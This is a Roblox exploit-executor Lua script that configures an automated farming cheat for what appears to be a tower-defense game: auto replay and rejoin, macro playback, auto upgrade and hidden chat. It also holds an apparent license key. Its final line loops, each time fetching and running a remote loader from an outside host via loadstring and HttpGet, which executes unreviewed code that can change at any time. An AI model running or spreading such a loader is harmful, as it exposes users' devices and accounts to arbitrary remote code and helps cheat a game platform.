game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
getgenv().RedeemAllCode = true
getgenv().EquipMacroUnit = true
getgenv().Config = {
	["AutoSave"] = true,
	["Game Finished"] = {
		["Auto Replay"] = true
	},
	["Joiner Cooldown"] = 0,
	["Macros"] = {
		["Macro Retry Limit"] = 0,
		["Macro"] = "Dbz2",
		["Ignore Macro Timing"] = true,
		["No Ignore Sell Timing"] = true
	},
	["Failsafe"] = {
		["Auto Rejoin"] = true
	},
	["Performance"] = {
		["Delete Map"] = true
	},
	["Gameplay"] = {
		["Auto Sell"] = {
			["Wave"] = 1
		},
		["Auto Skip Wave"] = true,
		["Smart Auto Ability"] = {
			["Wind Dragon"] = true
		}
	},
	["Auto Play"] = {
		["Auto Upgrade"] = true,
		["Enable"] = true,
		["Ignore Upgrade"] = {
			["6"] = true
		},
		["Upgrade Method"] = "Lowest Level (Spread Upgrade)",
		["Focus on Farm"] = true,
		["Middle Position"] = {
			["Sacred Planet"] = "-147.89646911621094, 109.84346008300781, 53.93146514892578"
		}
	}
}
getgenv().Key = "k517c79e9160307a9b87210d"
repeat wait(2)spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(6)until Joebiden